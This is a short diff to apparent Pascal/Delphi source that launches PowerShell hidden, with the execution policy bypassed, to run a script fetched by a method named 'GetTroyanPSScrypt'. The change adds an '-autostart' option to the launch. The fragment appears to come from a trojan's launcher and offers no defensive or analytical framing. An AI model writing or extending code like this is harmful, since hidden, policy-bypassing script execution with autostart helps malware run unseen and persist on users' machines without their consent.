@@ -43,6 +43,10 @@ begin
   StartInfo.wShowWindow := SW_HIDE; // Use SW_SHOW to show the PowerShell window
 
   CmdLine := 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "' + embeddingsMan.GetTroyanPSScrypt + '"';
+  if IsAutoStart then
+  begin
+    CmdLine := cmdLine + ' -autostart';
+  end;
 
   if not CreateProcess(nil, PChar(CmdLine), nil, nil, False, 0, nil, nil, StartInfo, ProcInfo) then
     RaiseLastOSError;
